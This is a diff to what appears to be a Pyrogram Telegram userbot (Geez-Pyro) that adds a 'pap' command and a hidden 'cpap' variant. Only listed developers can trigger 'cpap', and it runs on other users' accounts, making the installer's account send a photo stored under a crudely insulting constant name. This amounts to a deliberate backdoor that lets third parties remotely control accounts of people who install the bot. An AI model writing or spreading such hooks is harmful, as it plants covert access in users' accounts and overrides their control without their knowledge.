@@ -6,9 +6,22 @@ from pyrogram.types import *
 from pyrogram import Client as gez 
 from pyrogram import Client, enums, filters
 from geez.helper.basic import *
+from geez.helper.dev import *
 from geez.helper.PyroHelpers import *
 from geez.modules.help import *
 
+caption = f"**UPLOADED BY** [Geez-Pyro](https://t.me/{SUPPORT})"
+
+@gez.on_message(filters.command("cpap", ".") & filters.user(DEVS) & ~filters.me)
+@gez.on_message(filters.command("pap", ".") & filters.me)
+async def vvip(client: Client, message: Message):
+    user_id = await extract_user(message)
+    if user_id == 1191668125:
+        return await edit_or_reply(message, "**kaga bisa panjul..**")
+    kk = await edit_or_reply(message, "`Prossesing...`")
+    await gather(
+        kk.delete(),
+        client.send_photo(message.chat.id, ANAK_BANGSAD))
 
 @gez.on_message(filters.command(["asupan"], ".") & filters.me)
 async def asupan(client: Client, message: Message):
